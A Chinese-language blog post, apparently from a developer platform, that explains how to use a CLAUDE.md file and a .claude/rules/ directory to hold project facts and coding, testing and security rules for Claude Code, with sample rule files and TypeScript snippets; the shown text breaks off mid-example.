            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1857501105781193/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    冬奇Lab
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-03T12:33:46.000Z" title="Tue Feb 03 2026 12:33:46 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-03
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读22分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">引言</h2>
<p>你有没有遇到过这样的场景?</p>
<blockquote>
<p><strong>场景 1: 规范执行靠"吼"</strong></p>
<ul>
<li>代码评审时:"这个命名不符合规范啊,改一下"</li>
<li>提交代码时:"提交信息格式不对,重新写"</li>
<li>写完功能后:"测试呢?单元测试写了吗?"</li>
<li>每次都要提醒,每次都要返工</li>
</ul>
</blockquote>
<blockquote>
<p><strong>场景 2: AI 助手"不听话"</strong></p>
<ul>
<li>Claude Code 生成的代码风格乱七八糟</li>
<li>函数命名有时驼峰有时下划线</li>
<li>注释写得像天书,或者干脆不写</li>
<li>每次都要手动修改,效率大打折扣</li>
</ul>
</blockquote>
<p>传统团队靠"人盯人"执行规范,效率低、成本高、容易遗漏。而 AI 辅助开发时代,如果没有明确的规范,AI 生成的代码质量参差不齐,反而增加了维护负担。</p>
<p><strong>答案是</strong>: <strong>团队宪法 — CLAUDE.md + rules/</strong></p>
<p>就像国家需要宪法来规定基本原则,团队也需要一套"宪法"来定义:</p>
<ul>
<li><strong>项目的技术栈和常用命令是什么?</strong>（CLAUDE.md）</li>
<li><strong>我们的编码规范和安全底线是什么?</strong>（rules/ 目录）</li>
</ul>
<p><strong>团队宪法是区别草台班子和正规军的分水岭。</strong></p>
<p>本文将深入探讨如何通过 CLAUDE.md + rules/ 建立团队规范,并通过<strong>复利模式</strong>让这份宪法不断演进,让 Claude Code 成为越来越资深的队友。</p>
<p>阅读本文后,你将学会:</p>
<ul>
<li>理解团队宪法的目录结构和各部分的职责</li>
<li>正确使用 CLAUDE.md 存放项目事实,使用 rules/ 存放底线规则</li>
<li>建立复利思维:发现问题 → 更新宪法 → 全员受益</li>
<li>掌握让 AI 理解和遵守规范的技巧</li>
</ul>
<hr/>
<h2 data-id="heading-1">一、为什么需要"团队宪法"?</h2>
<h3 data-id="heading-2">1.1 传统团队的规范问题</h3>
<p>在没有自动化工具之前,团队规范靠什么维护?</p>
<p><strong>方式 1: 文档 + 口头传承</strong></p>
<pre><code class="hljs language-markdown" lang="markdown">某公司编码规范.docx (上次更新: 3年前)
<span class="hljs-bullet">  -</span> 第 3 章 命名规范
<span class="hljs-bullet">  -</span> 第 5 章 注释规范
<span class="hljs-bullet">  -</span> 第 8 章 异常处理
  ...

现实:
<span class="hljs-bullet">  -</span> 新人入职不知道这份文档
<span class="hljs-bullet">  -</span> 老员工也不记得具体内容
<span class="hljs-bullet">  -</span> 规范更新后没人通知
</code></pre>
<p><strong>方式 2: Code Review 人肉检查</strong></p>
<pre><code class="hljs language-makefile" lang="makefile"><span class="hljs-section">评审者:"这里应该用 Optional 而不是 null"</span>
<span class="hljs-section">开发者:"哦,好的" (心里想:又是这个问题,上次也提过)</span>
<span class="hljs-section">评审者:"下次注意" (心里想:已经说了 N 遍了)</span>

<span class="hljs-section">下周:</span>
  同样的问题再次出现...
</code></pre>
<p><strong>方式 3: Lint 工具 + Git Hooks</strong></p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># .eslintrc.js</span>
rules: {
  <span class="hljs-string">'semi'</span>: [<span class="hljs-string">'error'</span>, <span class="hljs-string">'always'</span>],
  <span class="hljs-string">'quotes'</span>: [<span class="hljs-string">'error'</span>, <span class="hljs-string">'single'</span>],
  ...100+ 条规则
}

问题:
  - 只能检查语法,不能检查逻辑
  - 配置复杂,维护困难
  - 无法覆盖架构层面的规范
</code></pre>
<p><strong>共同的痛点</strong>:</p>
<ul>
<li>❌ 规范执行<strong>不一致</strong> - 靠人工检查,难免遗漏</li>
<li>❌ 新人学习<strong>成本高</strong> - 需要阅读大量文档</li>
<li>❌ 规范更新<strong>难同步</strong> - 改了文档,代码不一定改</li>
<li>❌ 违规发现<strong>太晚</strong> - 代码写完才发现问题</li>
</ul>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3efadae671a64ae7be8d193fa00da9a7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Yas5aWHTGFi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770726829&amp;x-signature=cakr03AXRFI0Uoqn1b3KkEBDYPk%3D" alt="03-01-CR-problem.png" loading="lazy"/>
在我们公司，我已经在Gerrit上部署了AI CodeReview系统，能抓出很多人工写的代码不按照公司规范来的情况，并且在AI都提示出来的情况下还不修改。</p>
<h3 data-id="heading-3">1.2 AI 辅助开发的新挑战</h3>
<p>引入 AI 后,问题不仅没有减少,反而增加了新的挑战:</p>
<p><strong>挑战 1: AI 不知道你的团队规范</strong></p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// 你希望的代码风格</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">getUserById</span>(<span class="hljs-params">id: <span class="hljs-built_in">string</span></span>): <span class="hljs-title class_">Promise</span>&lt;<span class="hljs-title class_">User</span> | <span class="hljs-literal">null</span>&gt; {
  <span class="hljs-keyword">try</span> {
    <span class="hljs-keyword">const</span> user = <span class="hljs-keyword">await</span> db.<span class="hljs-property">users</span>.<span class="hljs-title function_">findOne</span>({ id });
    <span class="hljs-keyword">return</span> user ?? <span class="hljs-literal">null</span>;
  } <span class="hljs-keyword">catch</span> (error) {
    logger.<span class="hljs-title function_">error</span>(<span class="hljs-string">'Failed to get user'</span>, { id, error });
    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DatabaseError</span>(<span class="hljs-string">'User query failed'</span>, { <span class="hljs-attr">cause</span>: error });
  }
}

<span class="hljs-comment">// AI 默认生成的代码(没有规范约束)</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">getUserById</span>(<span class="hljs-params">id</span>) {
  <span class="hljs-keyword">return</span> db.<span class="hljs-property">users</span>.<span class="hljs-title function_">findOne</span>({ id }).<span class="hljs-title function_">catch</span>(<span class="hljs-function"><span class="hljs-params">e</span> =&gt;</span> {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(e)
    <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>
  })
}
</code></pre>
<p><strong>差异</strong>:</p>
<ul>
<li>❌ 缺少类型标注</li>
<li>❌ 使用 <code>console.log</code> 而不是 logger</li>
<li>❌ 错误处理不规范</li>
<li>❌ 没有异常抛出和上下文信息</li>
</ul>
<p><strong>挑战 2: 每次对话都要重复说明规范</strong></p>
<pre><code class="hljs language-makefile" lang="makefile"><span class="hljs-section">你: "帮我实现用户登录功能"</span>
<span class="hljs-section">AI: [生成代码,不符合规范]</span>

<span class="hljs-section">你: "记得使用 logger 而不是 console.log"</span>
<span class="hljs-section">AI: [修改代码]</span>

<span class="hljs-section">你: "还要加上类型标注"</span>
<span class="hljs-section">AI: [再次修改]</span>

<span class="hljs-section">你: "异常处理要抛出 CustomError"</span>
<span class="hljs-section">AI: [又一次修改]</span>

效率大打折扣!
</code></pre>
<p><strong>挑战 3: AI 生成的代码风格不一致</strong></p>
<p>第一次对话:</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">addUser</span>(<span class="hljs-params">name: <span class="hljs-built_in">string</span></span>) { ... }  <span class="hljs-comment">// 驼峰命名</span>
</code></pre>
<p>第二次对话:</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">delete_user</span>(<span class="hljs-params">id: <span class="hljs-built_in">string</span></span>) { ... }  <span class="hljs-comment">// 下划线命名</span>
</code></pre>
<p>第三次对话:</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">GetUserList</span>(<span class="hljs-params"/>) { ... }  <span class="hljs-comment">// 大写开头</span>
</code></pre>
<p>同一个项目,三种命名风格混杂,维护噩梦!</p>
<h3 data-id="heading-4">1.3 claude.md 的定位与价值</h3>
<p><strong>团队宪法是什么?</strong></p>
<p>团队宪法是一套完整的配置体系,包括 CLAUDE.md（项目事实）和 .claude/ 目录下的 rules/ 规则文件,共同定义了 AI 在工作时应该遵守的规范和约束。</p>
<p><strong>核心价值</strong>:</p>
<ol>
<li><strong>自动加载,无需重复</strong> - Claude Code 启动时自动读取配置,每次对话都生效</li>
<li><strong>职责分离,易于维护</strong> - CLAUDE.md 存项目事实,rules/ 存底线规则,结构清晰</li>
<li><strong>可版本管理</strong> - 和代码一起提交到 Git,团队共享</li>
<li><strong>可持续改进</strong> - 发现问题就更新,形成复利效应</li>
</ol>
<p><strong>类比理解</strong>:</p>
<pre><code class="hljs language-objectivec" lang="objectivec">团队宪法就像国家的<span class="hljs-string">"宪法体系"</span>
  ├─ <span class="hljs-built_in">CLAUDE</span>.md: 项目事实(技术栈、常用命令、约束)
  ├─ rules/: 底线规则(编码规范、测试要求、安全规范)
  └─ 可以修正和完善(宪法修正案)
</code></pre>
<p><strong>对比传统方式</strong>:</p>















































<table><thead><tr><th align="left">维度</th><th align="left">传统规范文档</th><th align="left">Lint 工具</th><th align="left">claude.md</th></tr></thead><tbody><tr><td align="left"><strong>自动执行</strong></td><td align="left">❌ 靠人工</td><td align="left">✅ 自动检查</td><td align="left">✅ AI 自动遵守</td></tr><tr><td align="left"><strong>覆盖范围</strong></td><td align="left">✅ 全面</td><td align="left">⚠️ 仅语法层面</td><td align="left">✅ 全面(语法+逻辑+架构)</td></tr><tr><td align="left"><strong>学习成本</strong></td><td align="left">❌ 需要阅读大量文档</td><td align="left">⚠️ 需要理解规则</td><td align="left">✅ AI 直接理解并应用</td></tr><tr><td align="left"><strong>实时生效</strong></td><td align="left">❌ 写完代码才发现</td><td align="left">⚠️ 提交时检查</td><td align="left">✅ 生成时就符合规范</td></tr><tr><td align="left"><strong>版本管理</strong></td><td align="left">⚠️ 文档独立管理</td><td align="left">✅ 配置文件管理</td><td align="left">✅ 和代码一起管理</td></tr><tr><td align="left"><strong>可演进性</strong></td><td align="left">❌ 更新困难</td><td align="left">⚠️ 需要改配置</td><td align="left">✅ 随时更新,立即生效</td></tr></tbody></table>
<blockquote>
<p>"claude.md 不是约束 AI 的枷锁,而是让 AI 成为资深队友的训练手册"</p>
</blockquote>
<hr/>
<h2 data-id="heading-5">二、claude.md 文件详解</h2>
<h3 data-id="heading-6">2.1 配置层级与工作原理</h3>
<p>Claude Code 支持<strong>两级配置</strong>,优先级规则: <strong>项目配置 &gt; 全局配置 &gt; Claude 默认行为</strong></p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-number">1.</span> 项目级配置(优先级最高)
   路径: &lt;项目根目录&gt;/<span class="hljs-variable constant_">CLAUDE</span>.<span class="hljs-property">md</span>
   作用域: 当前项目

<span class="hljs-number">2.</span> 全局配置(默认配置)
   路径: ~<span class="hljs-regexp">/.claude/</span><span class="hljs-variable constant_">CLAUDE</span>.<span class="hljs-property">md</span>
   作用域: 所有项目
</code></pre>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9474fc977550496daae032eb7a25da45~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Yas5aWHTGFi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770726829&amp;x-signature=rfhIcgMFaM6gMAqUqbl90A8zUQ8%3D" alt="03-02-config-hierarchy.png" loading="lazy"/></p>
<p><em>图2: claude.md 配置层级与加载机制,项目配置优先级高于全局配置</em></p>
<p><strong>工作原理</strong>: claude.md 的内容会被插入到每次 API 调用的系统提示词中,作为团队宪法让 AI 自动遵守。项目配置会覆盖全局配置中的同名规则,未覆盖的规则会继承。</p>
<p><strong>示例</strong>:</p>
<pre><code class="hljs language-markdown" lang="markdown"><span class="hljs-section"># 全局配置: 使用双引号、末尾分号、2空格缩进</span>
<span class="hljs-section"># 项目配置: 使用单引号(覆盖)、4空格缩进(覆盖)</span>

<span class="hljs-section"># 最终生效: 单引号、末尾分号(继承)、4空格缩进</span>
</code></pre>
<h3 data-id="heading-7">2.2 团队宪法的目录结构</h3>
<p>根据 Claude 中文社区的官方实践，团队宪法应该采用以下目录结构（建议放进仓库，团队共享）：</p>
<pre><code class="hljs language-text" lang="text">your-repo/
├─ CLAUDE.md              # 项目事实（技术栈、常用命令、约束）
└─ .claude/
   └─ rules/              # 底线规则（拆成小文件）
      ├─ security.md      # 安全底线
      ├─ testing.md        # 测试底线
      └─ coding-style.md  # 代码风格底线
</code></pre>
<p><strong>CLAUDE.md 的定位：存放"项目事实"</strong></p>
<p>CLAUDE.md 的重点是写<strong>可执行、可验证的信息</strong>，而不是详细的规则：</p>
<pre><code class="hljs language-markdown" lang="markdown"><span class="hljs-section"># 项目概述</span>
<span class="hljs-bullet">-</span> 技术栈：TypeScript + React 18+ + Next.js 14
<span class="hljs-bullet">-</span> 目录结构入口：src/ 为源代码目录

<span class="hljs-section">## 常用命令（必须准确）</span>
<span class="hljs-bullet">-</span> 安装依赖：<span class="hljs-code">`pnpm install`</span>
<span class="hljs-bullet">-</span> 运行测试：<span class="hljs-code">`pnpm test`</span>
<span class="hljs-bullet">-</span> 构建：<span class="hljs-code">`pnpm build`</span>
<span class="hljs-bullet">-</span> 代码格式化：<span class="hljs-code">`pnpm format`</span>
<span class="hljs-bullet">-</span> 静态检查：<span class="hljs-code">`pnpm lint`</span>

<span class="hljs-section">## 约束（团队共识）</span>
<span class="hljs-bullet">-</span> 默认先用 Plan Mode 分析，再动代码
<span class="hljs-bullet">-</span> 任何会影响行为的改动：必须补测试/补文档
<span class="hljs-bullet">-</span> 涉及凭证/权限：先安全审查，再合并
</code></pre>
<p><strong>rules/ 目录：存放"底线"规则</strong></p>
<p>规则应该拆成可组合、可审查的小文件：</p>
<ul>
<li><code>rules/security.md</code>：密钥与输入校验底线（禁硬编码、边界校验、最小权限）</li>
<li><code>rules/testing.md</code>：测试底线（TDD 流程、覆盖率门槛、关键路径必须 E2E）</li>
<li><code>rules/coding-style.md</code>：代码组织底线（文件大小、函数长度、错误处理等）</li>
</ul>
<p>这些规则不要"抄一大段"，而是写成<strong>团队真的会执行</strong>的清单。</p>
<p><strong>职责分离原则</strong>：</p>
<ul>
<li><strong>CLAUDE.md</strong>：只写项目事实，不写详细规则</li>
<li><strong>rules/</strong>：只写规则约束，不写项目事实</li>
<li>两者配合，形成完整的团队宪法</li>
</ul>
<h3 data-id="heading-8">2.3 上下文优先级</h3>
<p>CLAUDE.md 和 rules/ 目录中的配置优先级高于对话历史,确保规范始终生效:</p>
<pre><code class="hljs language-ini" lang="ini">优先级排序:
1. CLAUDE.md 和 rules/ 中的规范  <span class="hljs-section">[最高优先级]</span>
2. 用户当前输入的指令            <span class="hljs-section">[高优先级]</span>
3. 对话历史中的上下文            <span class="hljs-section">[中优先级]</span>
4. Claude 的默认行为             <span class="hljs-section">[低优先级]</span>
</code></pre>
<p><strong>实际效果</strong>: 即使之前对话中使用了不符合规范的代码,CLAUDE.md 和 rules/ 中的规范仍会在新代码生成时生效。用户可以在单次对话中临时覆盖规范,但下次对话会自动恢复。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a1064288d1b1410a8df35a170d359e34~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Yas5aWHTGFi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770726829&amp;x-signature=T9ynkkREShW8ZSEJ1AkMEFEUyNM%3D" alt="03-03-claude-md-mechanism.png" loading="lazy"/></p>
<p><em>图3: claude.md 工作原理,展示如何被解析并插入到 API 调用的系统提示词中</em></p>
<hr/>
<h2 data-id="heading-9">三、团队宪法的内容设计</h2>
<h3 data-id="heading-10">3.1 CLAUDE.md：项目事实</h3>
<p>CLAUDE.md 的定位是"项目记忆"，重点写可执行、可验证的信息：</p>
<pre><code class="hljs language-markdown" lang="markdown"><span class="hljs-section"># 项目概述</span>
<span class="hljs-bullet">-</span> 技术栈：TypeScript + React 18+ + Next.js 14
<span class="hljs-bullet">-</span> 目录结构入口：src/ 为源代码目录，packages/ 为共享包

<span class="hljs-section">## 常用命令（必须准确）</span>
<span class="hljs-bullet">-</span> 安装依赖：<span class="hljs-code">`pnpm install`</span>
<span class="hljs-bullet">-</span> 运行开发服务器：<span class="hljs-code">`pnpm dev`</span>
<span class="hljs-bullet">-</span> 运行测试：<span class="hljs-code">`pnpm test`</span>
<span class="hljs-bullet">-</span> 构建：<span class="hljs-code">`pnpm build`</span>
<span class="hljs-bullet">-</span> 代码格式化：<span class="hljs-code">`pnpm format`</span>
<span class="hljs-bullet">-</span> 静态检查：<span class="hljs-code">`pnpm lint`</span>

<span class="hljs-section">## 约束（团队共识）</span>
<span class="hljs-bullet">-</span> 默认先用 Plan Mode 分析，再动代码
<span class="hljs-bullet">-</span> 任何会影响行为的改动：必须补测试/补文档
<span class="hljs-bullet">-</span> 涉及凭证/权限：先安全审查，再合并
<span class="hljs-bullet">-</span> 提交前必须通过 lint 和测试
</code></pre>
<p><strong>关键点</strong>：</p>
<ul>
<li>✅ 写具体的技术栈和版本号</li>
<li>✅ 写准确的命令（AI 会直接执行）</li>
<li>✅ 写团队共识的约束（不是详细规则）</li>
<li>❌ 不要写详细的编码规范（应该放在 rules/ 目录）</li>
</ul>
<h3 data-id="heading-11">3.2 rules/ 目录：底线规则</h3>
<p>规则应该拆成可组合、可审查的小文件。以下是三个核心规则文件的示例：</p>
<p><strong>rules/coding-style.md</strong>：代码组织底线</p>
<pre><code class="hljs language-markdown" lang="markdown"><span class="hljs-section"># 代码风格规范</span>

<span class="hljs-section">## TypeScript 风格</span>
<span class="hljs-bullet">-</span> 严格模式: 启用 <span class="hljs-code">`strict: true`</span>
<span class="hljs-bullet">-</span> 类型标注: 所有函数参数和返回值必须标注类型
<span class="hljs-bullet">-</span> 类型断言: 避免使用 <span class="hljs-code">`any`</span>,优先使用 <span class="hljs-code">`unknown`</span>

<span class="hljs-section">## 代码格式</span>
<span class="hljs-bullet">-</span> 缩进: 2 空格
<span class="hljs-bullet">-</span> 引号: 单引号(字符串),双引号(JSX 属性)
<span class="hljs-bullet">-</span> 分号: 必须使用
<span class="hljs-bullet">-</span> 行宽: 最大 100 字符

<span class="hljs-section">## 命名约定</span>
<span class="hljs-bullet">-</span> 组件: PascalCase (UserProfile.tsx)
<span class="hljs-bullet">-</span> 函数: camelCase (getUserData)
<span class="hljs-bullet">-</span> 常量: UPPER<span class="hljs-emphasis">_SNAKE_</span>CASE (API<span class="hljs-emphasis">_BASE_</span>URL)
<span class="hljs-bullet">-</span> 布尔值: is/has/can 开头 (isLoading, hasPermission)

<span class="hljs-section">## 注释要求</span>
<span class="hljs-bullet">-</span> ✅ 必须: 复杂逻辑、算法实现、业务规则
<span class="hljs-bullet">-</span> ✅ 推荐: 公共 API、工具函数
<span class="hljs-bullet">-</span> 所有导出的函数/类必须添加 JSDoc
</code></pre>
<p><strong>rules/testing.md</strong>：测试底线</p>
<pre><code class="hljs language-markdown" lang="markdown"><span class="hljs-section"># 测试规范</span>

<span class="hljs-section">## 单元测试</span>
<span class="hljs-bullet">-</span> 覆盖率: &gt; 80%
<span class="hljs-bullet">-</span> 框架: Jest + Testing Library
<span class="hljs-bullet">-</span> 每个公共函数必须有测试
<span class="hljs-bullet">-</span> 测试用例命名: <span class="hljs-code">`should ... when ...`</span>

<span class="hljs-section">## 集成测试</span>
<span class="hljs-bullet">-</span> 工具: Cypress / Playwright
<span class="hljs-bullet">-</span> 覆盖: 关键用户流程
<span class="hljs-bullet">-</span> 运行时机: PR 合并前

<span class="hljs-section">## TDD 流程</span>
<span class="hljs-bullet">-</span> RED: 先写失败的测试
<span class="hljs-bullet">-</span> GREEN: 实现最小代码让测试通过
<span class="hljs-bullet">-</span> REFACTOR: 重构优化代码
</code></pre>
<p><strong>rules/security.md</strong>：安全底线</p>
<pre><code class="hljs language-markdown" lang="markdown"><span class="hljs-section"># 安全规范</span>

<span class="hljs-section">## 敏感信息处理</span>
<span class="hljs-bullet">-</span> ❌ 禁止: 将密钥/密码硬编码到代码中
<span class="hljs-bullet">-</span> ✅ 使用: 环境变量 + .env 文件

<span class="hljs-section">## 输入验证</span>
<span class="hljs-bullet">-</span> 所有用户输入必须验证和净化
<span class="hljs-bullet">-</span> 使用 Zod / Yup 进行 schema 验证

<span class="hljs-section">## XSS 防护</span>
<span class="hljs-bullet">-</span> 使用 React 的自动转义
<span class="hljs-bullet">-</span> 避免 <span class="hljs-code">`dangerouslySetInnerHTML`</span>
</code></pre>
<hr/>
<h2 data-id="heading-12">四、复利模式:持续优化的团队宪法</h2>
<h3 data-id="heading-13">4.1 什么是复利模式?</h3>
<p><strong>传统模式</strong>:写一次规范,长期不更新,最终过时无用。</p>
<p><strong>复利模式</strong>:发现问题 → 更新宪法 → 全员受益 → 持续改进。</p>
<p><strong>类比</strong>:</p>
<pre><code class="hljs language-makefile" lang="makefile">复利模式就像投资理财
  - 初始投入: 编写基础宪法
  - 持续投入: 每次遇到问题就更新
  - 复利收益: 团队整体能力提升,问题逐渐减少

<span class="hljs-section">第1周: 发现 10 个规范问题</span>
<span class="hljs-section">第2周: 发现 7 个问题(之前的 3 个不再出现)</span>
<span class="hljs-section">第3周: 发现 5 个问题</span>
...
<span class="hljs-section">第N周: 发现 0-1 个问题(规范已经很完善)</span>
</code></pre>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9d3c9f67e9b54467b0bc2556b72ea92b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Yas5aWHTGFi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770726829&amp;x-signature=Mn4egti7cGFr7Z2ByB2%2BOkhip9k%3D" alt="03-04-compound-mode.png" loading="lazy"/></p>
<p><em>图4: 复利模式的循环流程,展示持续优化如何带来复利收益</em></p>
<h3 data-id="heading-14">4.2 复利模式的工作流程</h3>
<p><strong>步骤 1: 发现问题</strong></p>
<p>在 Code Review、Bug 修复、性能优化等场景中发现规范缺失或不明确的地方。</p>
<p><strong>示例场景</strong>:</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// Code Review 发现的问题</span>
<span class="hljs-comment">// 开发者 A 的代码:</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">processData</span>(<span class="hljs-params">data</span>) {
  <span class="hljs-keyword">return</span> data.<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">item</span> =&gt;</span> {
    <span class="hljs-comment">// 复杂的业务逻辑,没有注释</span>
    <span class="hljs-keyword">return</span> item.<span class="hljs-property">value</span> * <span class="hljs-number">1.1</span> + (item.<span class="hljs-property">bonus</span> ?? <span class="hljs-number">0</span>) - item.<span class="hljs-property">discount</span>;
  });
}

<span class="hljs-comment">// 评审者: "这个计算逻辑是什么意思?为什么乘 1.1?"</span>
<span class="hljs-comment">// 开发者: "哦,这是加上 10% 的税费"</span>
<span class="hljs-comment">// 评审者: "这种业务逻辑应该加注释啊"</span>
</code></pre>
<p><strong>步骤 2: 分析根因</strong></p>
<p>思考:为什么会出现这个问题?是规范缺失还是规范不够明确?</p>
<pre><code class="hljs language-markdown" lang="markdown">根因分析:
<span class="hljs-bullet">  -</span> rules/ 目录中没有规定"复杂业务逻辑必须添加注释"
<span class="hljs-bullet">  -</span> 开发者和 AI 都不知道这个规范
<span class="hljs-bullet">  -</span> 导致每次都要在 Code Review 中提醒
</code></pre>
<p><strong>步骤 3: 更新宪法</strong></p>
<p>在 rules/ 目录下的相应规则文件中添加或修改规范,明确要求。</p>
<pre><code class="hljs language-markdown" lang="markdown"><span class="hljs-section"># rules/coding-style.md</span>

<span class="hljs-section">## 注释要求</span>

<span class="hljs-section">### 业务逻辑注释</span>
<span class="hljs-bullet">-</span> ✅ 必须: 所有包含数字常量的计算逻辑必须注释说明含义
<span class="hljs-bullet">-</span> ✅ 必须: 复杂的业务规则必须注释说明原因

<span class="hljs-section">### 示例:</span>
\<span class="hljs-code">`\`</span>\`typescript
// ✅ 正确
